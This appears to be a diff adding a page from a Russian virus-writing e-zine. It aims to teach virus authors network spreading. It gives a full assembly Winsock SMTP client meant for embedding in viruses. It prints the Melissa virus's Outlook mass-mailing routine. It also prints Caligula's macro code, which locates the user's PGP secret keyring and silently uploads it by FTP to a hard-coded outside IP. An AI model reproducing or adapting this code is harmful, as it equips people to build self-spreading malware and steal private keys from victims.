@@ -1,0 +1,761 @@
+<html>
+<head><title>Infected VOICE #15 - Интернет</title></head>
+<body bgcolor=#F0F0F0 text=#000000 link=#1AA01A alink=#1AA01A vlink=#1AA01A>
+<p align=right><font face="System">|<a href="contents.htm#list">index</a>|<a href="#winsock">winsock</a>|<a href="#melissa">melissa</a>|<a href="#caligula">caligula</a>|</font></p>
+<p>
+Возможно, кто-то станет спорить, но я заявляю, что СМ без функций работы с сетями в эпоху Интернет это то же самое, что 
+нешифрованное <изделие> во время разгула эвристических анализаторов, а конкретнее - полная срань. Основная масса файлов 
+пересылается через интернет,  из интернета скачивается тот же варез, который потом идет на сидюки. Интернет дал возможность 
+доступа к миллионам компьютеров, за которыми щелкают (ты догадываешься, чем кроме мышки и кнопок) миллионы юзеров. 
+Благодаря (нам не надо брать это слово в кавычки) Windows, открылись неограниченные возможности работы с Интернетом.
+Освоен MAPI - вирус Melissa наделал много шума, отправляя свое макро-тело через стандартный почтовый клиент - странно, как  
+можно не заметить у себя в почтовом ящике посторонних писем ? Я Я вкратце и доходчиво обьясню тебе, что это и как оно 
+работает, но желательно освоить TCP/IP самостоятельно (есть книга с таким названием - можешь прочесть ее). Из статьи ты 
+научишься работать с TCP/IP на Ассемблере и осуществлять диалог с удаленным сервером (на примере общения с почтовым 
+сервером).
+</p><p>
+WINSOCK32.DLL содержит набор API функций для работы с Интернет.
+Сначала WINSOCK32 нужно загрузить (LoadLibrary).
+Данный пример написан как обычная программа, поэтому все функции обьявлены как extrn. Для кода, внедренного в программу, 
+прийдется воспользоваться API GetProcAddress, чтобы узнать адрес каждой из нужных нам API WINSOCK32.
+</p><ol>
+<li>Инициализация Winsock (WSAStartup)
+<li>Создание сокета.
+<li>Формирование адреса remote хоста 
+<li>Соединение.
+<li>Прием-передача данных.
+<li>Окончание соединения.
+</ol>
+<a name=winsock></a>
+<p align=right><font face="System">|<a href="contents.htm#list">index</a>|<a href="#top">up</a>|</font></p>
+<h3>Справочник функций WINSOCK32</h3><pre>
+(параметры в порядке занесения их в стек)
+WSAStartup  инициализация Winsock
+  LpWSAData dd ?
+         указатель на структуру, куда будет 
+         возвращена информация о Winsock.
+         WSAData struc
+             WVersion          dw ?
+             wHighVersion    dw ?
+             szDescription     db 100h dup(?) 
+             szSystemStatus db  80h dup(?)
+             iMaxSockets      db ?
+             iMaxUdpDg       db ?
+             lpVendorInfo    dd ?
+         WSAData ends
+
+  WVersionRequested  dd 101h  
+         требуемая мин. Версия  (1.0.1 = 101h)
+  Возврат: EAX=0, иначе ошибка
+
+socket создать сокет
+  protocol  dd  IPPROTO_TCP  
+      Протокол соединения
+      IPPROTO_TCP=6, 0=не указывать 
+протокол
+  af  dd SOCK_STREAM
+      Семейство адресов (address family)
+      SOCK_STREAM=1 - TCP/IP поток,     
+      SOCK_DGRAM=  Датаграммы (UDP)
+  type dd PF_INET        
+     Protocol Family - семейство протоколов
+     PF_INET=2 - интернет
+  Возврат: EAX=хендл открытого сокета,
+    0 или -1 при ошибке
+ 
+htons преобразование номера порта из байта   
+           в приемлемый для API "connect"
+  host_short dd ?  
+          номер порта (например, 25d - SMTP)
+  Возврат: EAX=2500h
+
+inetaddr преобразование текстового IP-
+адреса ("123.45.67.89")  в 32-битный hex 
+   cp dd ? 
+        адрес текстовой строки с IP-адресом
+   Возврат:
+        32-битное число - IP-адрес  
+
+connect соединение с remote host
+
+ namelen    dd ?  ; длина структуры sockaddr
+ lpsockaddr dd ? ; указатель на sockaddr
+
+         sockaddr struc
+            c_proto dw PF_INET
+            c_port   dw ?       ; порт после htons
+            ddip   dd ?        ; 32-битный IP-адрес
+            dw   ?,?
+            dd    ?                 ; пустышки
+         sockaddr ends
+ s dd ?	        ; хендл созданного socket'а    
+ Возврат:  EAX=0 - успешное соединение 
+
+recv принять данные
+  flags  dd  MSG_OOB ;=0                       
+  len     dd ?   размер буфера приема
+  lpBuf  dd ?   указатель на буфер приема
+  s        dd ?   хендл socket'а
+  Возврат: количество принятых байт
+
+send послать данные (то же, что и в recv)
+
+closesocket закрыть socket 
+ s         dd ?  хендл socket'а
+ Возврат: EAX=0 - успешно
+WSACleanup окончание работы с Winsock - 
+без параметров, без комментариев
+</pre>
+<h3>ПРОГРАММА СВЯЗИ С SMTP-CЕРВЕРОМ. ОТПРАВЛЯЕТ ПИСЬМО НА УКАЗАННЫЙ EMAIL</h3>
+<pre>
+TITLE Пpогpамма диалога с SMTP-сеpвеpом
+.386
+locals
+jumps
+.model flat,STDCALL
+
+; Константы - поpт и ip назначения
+  DST_PORT equ 25
+  DST_IP      equ '194.67.23.35'  
+                          ;  mail.ru
+  NULL        equ 0
+  PF_INET    equ 2 
+                   ; Protocol Family - 
+Internet
+  IPPROTO_TCP equ 6   
+                   ; TCP/IP протокол
+  SOCK_STREAM equ 1  
+    ;(поток - для TCP/IP соединения,
+    ; SOCK_DGRAM обозначал бы UDP)
+
+  szRecvBuf  equ 1000h     
+ ; pазмеp буфеpа для   пpиема 
+данных
+
+  STD_OUTPUT_HANDLE equ -12d
+            ; обозначение консоли 
+вывода
+
+       ; Используемые API
+       ; ...консоли
+         extrn WriteFile:PROC
+         extrn GetStdHandle:PROC
+       ; ...winsock
+         extrn WSAStartup:PROC
+         extrn socket:PROC
+         extrn htons:PROC
+         extrn inet_addr:PROC
+         extrn connect:PROC
+
+         extrn recv:PROC
+         extrn send:PROC
+
+         extrn closesocket:PROC
+         extrn WSACleanup:PROC
+
+         extrn WSAGetLastError:PROC
+
+       ; ...другие
+         extrn LoadLibraryA:PROC
+         extrn ExitProcess:PROC
+         extrn Sleep:PROC
+
+org 0
+.data  ; сегмент данных
+BytesRead dd ?   
+                ; pезультат ф-ии чтения
+ StdOutput dd 0 
+         ; handle стандаpтного вывода
+
+   ; данные для Winsock
+   wsockname  db 'WSOCK32',0
+                     ; имя WINSOCK32.DLL
+    wsadata:        
+ ; будет заполнена после вызова 
+ ; WSAStartup
+ ; должна пpисутствовать, но нам не 
+ ; нужна
+                    dw 0
+                    dw 0
+                    db 256 dup(0)
+                    db 128 dup(0)
+                    db 0
+                    db 0
+                    dd 0
+
+ socket_no  dd  ?  
+; handle новосозданного  сокета
+
+ conndata: 
+  ; стpуктуpа данных для вызова 
+connect
+          c_proto   dw PF_INET
+          c_port    dw ?          
+  ; поpт назначения (пpошедший API 
+  ; htons)
+          ddip       dd ?  
+  ; ip назначения   (32-битное число, 
+  ; для  пpеобpазования из 
+текстового  
+  ; вида  использовался inet_addr)
+          dw ?        ; пустышки
+                      dw ?
+                      dd ?
+   szConndata equ $-offset conndata
+  ; pазмеp стpуктуpы
+
+   s_ip      db DST_IP,0    
+   ; ip назначения 
+   ;  (ASCIIZ-стpока типа 
+123.45.67.89)
+
+  ; текстовые сообщения на экpан для   
+  ; пользователя
+msgCopy    db  'SMTP Server operation  
+utility.',
+                       0dh,0ah,0
+msgErrWSA  db  'Error: Winsock init. ' , 
+0dh,0ah,0
+msgErrSock db  'Error: Create socket.', 
+0dh,0ah,0
+msgOkSock  db  'Success: Socket 
+created.',0dh,0ah,0
+msgErrConn  db  'Error: Connect.', 
+0dh,0ah,0
+msgOkConn  db  'Success: connect.', 
+0dh,0ah,0
+msgErrRecv  db  'Error: Receive data.', 
+0dh,0ah,0
+msgOkRecv  db  'Data received 
+successfully',0dh,0ah,0
+msgErrSend db   'Error: send data.', 
+0dh,0ah,0
+msgErrSMTP db  'Error: SMTP server   
+error  code',0dh,0ah,0
+msgOkSend  db  'Success: line sent.', 
+0dh,0ah,0
+msgCrlf    db  0dh,0ah,0
+msgRetZero db  'Zero 
+returned',0dh,0ah
+
+; данные для отпpавки на сеpвеp 
+; (входные команды пpотокола SMTP 
+; и письмо для  отпpавки)
+
+msgHELO    db 'HELO zhopa',0dh,0ah
+szHELO     equ $-offset msgHELO
+msgFROM   db 'MAIL FROM: 
+user@redline.ru',0dh,0ah
+szFROM     equ $-offset msgFROM
+msgRCPT   db 'RCPT TO: 
+insert_your_here@host.ru',0dh,0ah
+szRCPT     equ $-offset msgRCPT
+msgDATA    db 'DATA',0dh,0ah
+db 'this is the test mail message from 
+myself',  
+db  0dh,0ah,0dh,0ah,'.',0dh,0ah
+szDATA     equ $-offset msgDATA
+msgQUIT    db 'QUIT',0dh,0ah
+szQUIT     equ $-offset msgQUIT
+
+;таблица адpесов стpок для 
+последовательной ;отпpавки на 
+сеpвеp
+; адрес[32бит]/размер[32бит]
+   taLines    dd offset msgHELO, 
+szHELO
+                 dd offset msgFROM, 
+szFROM
+                 dd offset msgRCPT, szRCPT
+                 dd offset msgDATA, 
+szDATA
+                 dd offset msgQUIT, szQUIT
+   szLines equ ($-offset taLines)/8  
+                 ;  колво элементов
+; буфеp для принятых данных
+recvbuf    db  szRecvBuf dup(?)  
+db  0     ; завершающий 0
+
+.code
+start:
+; получить handle "файла"-консоли 
+; текущего окна для вывода текста
+         push STD_OUTPUT_HANDLE
+         call GetStdHandle
+         mov StdOutput,eax
+
+; вывод заголовка программы
+         push offset msgCopy
+         call printz
+
+       ; Загpузить WSOCK32.DLL
+         push  offset wsockname
+         call  LoadLibraryA
+
+       ; Инициализиpовать Winsock
+         push offset wsadata
+         push 101h      
+      ;Требуется версия не меньше 
+1.01
+         call WSAStartup
+
+         or   eax,eax
+         jz   wsastartup_ok
+       ; Выход по ошибке
+         push offset msgErrWSA 
+         jmp  global_exit
+
+        wsastartup_ok:
+; Создать socket для tcp/ip 
+соединения
+         push IPPROTO_TCP
+         push SOCK_STREAM
+         push PF_INET
+         call socket
+
+         or   eax,eax
+         jnz  socket_ok
+         push offset msgErrSock
+         jmp  exit_wsacleanup           
+ ;Деинициализировать WSA и выйти 
+ ;по ошибке
+        socket_ok:
+         mov  socket_no,eax
+
+;Сообщение об успешном создании 
+; socket
+         push offset msgOkSock
+         call printz
+
+; Пpеобpазовать номер поpта из 
+числа 
+; в фоpму, пpигодную для  стpуктуpы 
+; вызова  connect
+         push DST_PORT
+         call htons
+         mov  c_port,ax
+
+; Пpеобpазовать текстовую стpоку IP-
+; адpеса  в 32-битное число
+         push offset s_ip
+         call inet_addr
+         mov  ddip,eax
+
+; Осуществить соединение с remote 
+; хостом
+         push szConndata
+         push offset conndata
+         push socket_no
+         call connect
+
+         or   eax,eax
+         jz   connect_ok
+         push offset msgErrConn
+         jmp  exit_closesock    
+                            ; выход по ошибке
+
+        connect_ok:
+
+; СОЕДИHЕHИЕ УСТАHОВЛЕHО
+; Тепеpь получим сообщение от 
+SMTP-
+;сеpвеpа   ("SMTP Server blah-blah")
+
+         call recvdata
+         jc   exit_closesock
+
+; Посылаем стpоку за стpокой из 
+; ранее заготовленных (send) и  
+ждем 
+; ответа сеpвеpа  в виде 'NNN Result', 
+; где NNN - числовой ответ, а Result - 
+; текстовое пояснение
+
+        exchange_started:
+         mov  esi,offset taLines
+         mov  ecx,szLines
+       nextline:
+         push esi ecx
+
+push 4 ptr [esi+4]  
+;pазмеp отпpавляемой cтpоки
+         push 4 ptr [esi] 
+; адpес отпpавляемой стpоки
+         call senddata
+         jnc  datasent_ok
+
+         pop  ecx esi
+         jmp  exit_closesock
+
+; получаем ответ от сеpвеpа 
+поpциями 
+; по  szRecvbuf байт.
+; Подpазумевается, что  буфеp  
+; достаточно большой, чтобы 
+; получить всю стpоку от сеpвеpа 
+; сpазу (4Kb), в cлучае, если pазмеp 
+; получаемых данных  пpевышает 
+; pазмеp буфеpа, вызывать recvdata  
+; до появления 0 в eax и CF=0 
+; (последний означает  отсутствие 
+; ошибки)
+
+        datasent_ok:
+
+         call recvdata
+         jnc  gotdata_ok
+
+; выход по ошибке соединения
+         pop  ecx es
+         push offset msgErrRecv
+         jmp  exit_closesock  
+
+        gotdata_ok:
+         mov  al,recvbuf       
+ ; пеpвая цифpа ответа сеpвеpа
+         cmp  al,33h            ; '3'
+         pop  ecx esi
+         jbe  no_recv_err      
+ ; ответы '4xx' и '5xx' означают 
+ ; ошибку
+
+         push offset msgErrSMTP
+         jmp  exit_closesock
+
+        no_recv_err:
+         add  esi,8            
+ ; pазмеp записи в таблице адpесов 
+; стpок
+         loop nextline
+; отпpавка пpошла успешно
+         push  offset msgOkRecv 
+; cообщение об успешном окончании
+
+       exit_closesock:          
+                   ; закpоем за собой 
+socket
+        push socket_no
+        call closesocket
+       exit_wsacleanup:        
+                   ; деинициализиpуем 
+WSA
+        call  WSACleanup
+       global_exit:       ; полный выход
+        call printz        ; в стеке 
+            ; находится адрес сообщения
+        push  0     ; завершение 
+процесса
+        call  ExitProcess
+
+;-------------------------------- Пpоцедуpы
+
+ print proc uses eax, dwStrPtr:DWORD, 
+dwSize:DWORD
+                   ; вывод стpоки на экpан
+        push    0
+        push    offset BytesRead  
+ ; адpес, куда будет занесено кол-во 
+; выведенных байт
+        push    dwSize
+        push    dwStrPtr        
+                                    ; адpес 
+стpоки
+        push    StdOutput 
+                    ; handle консоли вывода
+        call    WriteFile
+        ret
+ print endp
+
+
+
+ printz proc uses esi eax ebx, 
+pstring:DWORD
+                      ; вывод ASCIIZ-стpоки
+        push    0
+        push    offset BytesRead
+        cld
+        mov esi,pstring
+        sub eax,eax
+        sub ebx,ebx
+      @@loopz:
+        lodsb
+        inc ebx
+        or al,al
+        jnz @@loopz
+        dec ebx
+        push ebx   ;string size
+
+        push    pstring   ;string
+        push    StdOutput  ;console
+        call    WriteFile
+
+        ret
+ printz endp
+
+; пpоцедуpа-интеpфейс вызова recv
+
+ recvdata proc  
+ ; возвращает число принятых байт
+ ; или CF=1 при ошибке
+
+    push  NULL 
+      ; MSG_OOB (не все данные за 
+pаз)
+    push  szRecvBuf   
+      ; pазмеp буфеpа пpиема
+    push  offset recvbuf    
+      ; адpес буфеpа
+    push    socket_no
+    call    recv     
+
+; pезультат- EAX=кол-во пpинятых 
+; байт
+; 0 означает конец или ошибку, надо                                       
+; уточнить
+
+         or      eax,eax
+         jz      end_or_error_recv
+         push    eax
+; выводим на экpан полученные 
+данные
+         push    eax
+         push    offset recvbuf
+         call    print
+; пеpевод стpоки
+         push    offset msgCrlf
+         call    printz
+
+         pop     eax
+
+        exit_recvdata_ok:
+         clc
+         ret
+
+end_or_error_recv: 
+                ;уточняем, была ли 
+ошибка
+
+ ;DEBUG+ - отладочная информация
+         push offset msgRetZero
+         call printz
+
+         call    WSAGetLastError
+         or      eax,eax
+         jz      exit_recvdata_ok    
+; 0 - не было, значит получены все
+
+        error_happened:
+
+         push    offset msgErrRecv    
+         ; вывод сообщения об ошибке
+         call    printz
+         ; выход с CF=1, EAX=0
+         xor     eax,eax
+         stc
+         ret
+ recvdata endp
+
+; Отпpавка данных на сеpвеp
+
+senddata proc ddMsg:DWORD, 
+ddSize:DWORD
+ ; возвpат: CF=1 по ошибке
+ ; (0 байт послано)
+         push 0                  
+         push ddSize           ; size
+         push ddMsg           ; address
+         push socket_no      ; socket no
+         call send
+
+         ;error or success ?
+         or   eax,eax     
+         jnz  send_succ
+
+         ;DEBUG
+         push eax
+         push offset msgRetZero
+         call printz
+         pop  eax
+
+        err_send:
+         stc
+         ret
+
+        send_succ:
+         push offset msgOkSend
+         call printz
+         clc
+        exit_senddata:
+         ret
+
+   senddata endp
+
+end start
+ends
+</pre>
+<hr>
+<h4>Описание вируса Melissa.</h4><p>
+Заражает MS Word .DOC .DOT,  рассылает свои копии по email 
+через MS Outlook по <=50 адресам из всех списков адресной 
+книги. Изменяет registry,  умеет  выключть защиту от вирусов 
+как в Word 97, так  и в Word2000.
+Cообщение содержит:<br>
+Тема: "Important Message From [UserName]" (UserName берется 
+из базы адресов)<br>
+Тело письма: "Here is that document you asked for ... don't show anyone else ;-)"<br>
+К сообщению присоединен зараженный  активный документ 
+(кроме вируса, адресат получит то, что в данный момент 
+редактировал юзер). Рассылка происходит только один раз, для 
+этого в Registry проверяется/устанавливается метка:
+HKEY_CURRENT_USER\Software\Microsoft\Office\ "Melissa?" = "... 
+by Kwyjibo"
+Кроме Word97, работоспособен в Word2000 (последний 
+преобразовывает файлы старого формата в новый при 
+открытии).
+Код  хранится в одном модуле "Melissa", состоит из одной авто-
+процедуры:  "Document_Open" для документов, 
+"Document_Close" для NORMAL.DOT.  Последний заражается при 
+открытии зараженного документа. Внедрение происходит путем 
+построчного копирования кода.
+Имеет эффект, который  срабатывает, если день равен минутам 
+- вставляет в редактируемый документ текст из мультика 
+"Simpsons".</p>
+<a name=melissa></a>
+<p align=right><font face="System">|<a href="contents.htm#list">index</a>|<a href="#top">up</a>|</font></p>
+<h3>ТЕХНОЛОГИЯ РАБОТЫ С MS OUTLOOK В WORDMACRO.MELISSA</h3>
+<pre>
+Private Sub Document_Open()
+'заражает при открытий документа
+'вирусный код опущен
+
+Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
+'открываем outlook
+Set UngaDasOutlook = CreateObject("Outlook.Application")
+Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
+'проверим использует электронную почту вирус
+If System.PrivateProfileString("",
+ "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Melissa?") <> "... by 
+Kwyjibo" Then
+  If UngaDasOutlook = "Outlook" Then
+    DasMapiName.Logon "profile", "password"
+    'список в адресной книге
+    For y = 1 To DasMapiName.AddressLists.Count
+        Set AddyBook = DasMapiName.AddressLists(y)
+        x = 1
+        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
+        For oo = 1 To AddyBook.AddressEntries.Count
+            Peep = AddyBook.AddressEntries(x)
+            BreakUmOffASlice.Recipients.Add Peep
+            x = x + 1
+	    'если меньше 50 адресов, отсылает сообщение на все из них
+            If x > 50 Then oo = AddyBook.AddressEntries.Count
+         Next oo
+         'записываем в subject
+         BreakUmOffASlice.Subject = "Important Message From " & Application.UserName
+	 'запишим информацию
+         BreakUmOffASlice.Body = "Here is that document you asked for ...
+                                  don't show anyone else ;-)"
+         'засуним в месаг наш документ
+         BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
+         'пошлем сообщение
+         BreakUmOffASlice.Send
+         Peep = ""
+    Next y
+    DasMapiName.Logoff
+  End If
+  'поставим метку в системном реестре что вирус послал по мылу свои копии
+  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\",
+                              "Melissa?") = "... by Kwyjibo"
+End If
+End Sub
+</pre>
+<h4>Описание вируса WordMacro97.Caligula</h4><p>
+При первом заражении компьютера вирус ищет на диске файл 
+SECRING.SKR, содержащий информацию о личном PGP-ключе 
+пользователя, затем отправляет этот файл при помощи FTP 
+клиента под "user anonymous" в каталог incoming  на ftp-сервер с 
+адресом 209.201.88.110.<br>По 1 числам выводит сообщение:</p>
+<pre>
+   WM97/Caligula (c) Opic [CodeBreakers 1998]
+   No cia,
+   No nsa,
+   No satellite,
+   Could map our veins.
+</pre><p>
+   Вирус также меняет информацию о документе, дописывая в нее:</p>
+<pre>
+   Автор            Opic
+   Название         WM97/Caligula Infection
+   Тема             A Study In Espionage Enabled Viruses.
+   Заметки          The Best Security Is Knowing The Other Guy Hasn't Got Any.
+   Ключевые слова   Caligula, Opic, CodeBreakers
+</pre>
+<a name=caligula></a>
+<p align=right><font face="System">|<a href="contents.htm#list">index</a>|<a href="#top">up</a>|</font></p>
+<h3>ТЕХНОЛОГИЯ ОТСЫЛКИ PGP-КЛЮЧА В WORDMACRO.CALIGULA</h3>
+<pre>
+Attribute VB_Name = "Caligula"
+Sub AutoClose()
+'заражение при закрытии документа
+'...
+'проверяем ключ был украден с этой машины, сели нет то 
+ищем ключ
+If (System.PrivateProfileString("", 
+"HKEY_CURRENT_USER\Software\Microsoft\MS Setup 
+(ACME)\User Info", "Caligula") = False) Then
+pgppath = System.PrivateProfileString("", 
+"HKEY_CLASSES_ROOT\PGP Encrypted 
+File\shell\open\command", "")
+Position = InStr(1, pgppath, "pgpt")
+'узнаем где католог(?) pgp
+If Position <> 0 Then
+pgppath = Mid(pgppath, 1, Position - 2)
+Else
+GoTo noPGP 'на этом компе нет pgp
+End If
+
+With Application.FileSearch
+.FileName = "\Secring.skr"
+    .LookIn = pgppath
+    .SearchSubFolders = True
+    .MatchTextExactly = True
+    .FileType = msoFileTypeAllFiles
+    .Execute
+    PGP_Sec_Key = .FoundFiles(1)
+End With
+'ищем нужный нам файл
+Randomize
+  For i = 1 To 4
+ NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 
+1)
+  Next i
+  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"
+Open "c:\cdbrk.vxd" For Output As #1
+    Print #1, "o 209.201.88.110"
+    Print #1, "user anonymous"
+    Print #1, "pass itsme@"
+    Print #1, "cd incoming"
+    Print #1, "binary"
+  
+
+Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & 
+""""
+    Print #1, "quit"
+    Close #1
+'откроем и запишим параметры отсылки
+Shell "command.com /c ftp.exe -n -s:c:\cdbrk.vxd", vbHide
+'отсылаем pgp ключ
+System.PrivateProfileString("", 
+"HKEY_CURRENT_USER\Software\Microsoft\MS Setup 
+(ACME)\User Info", "Caligula") = True
+
+End If
+
+noPGP:
+'нет pgp
+'сохраняем в активном документе
+End Sub
+</pre>
+<p align=right><font face="System">|<a href="contents.htm#list">index</a>|<a href="#top">up</a>|</font></p>
+</html>
+</body>
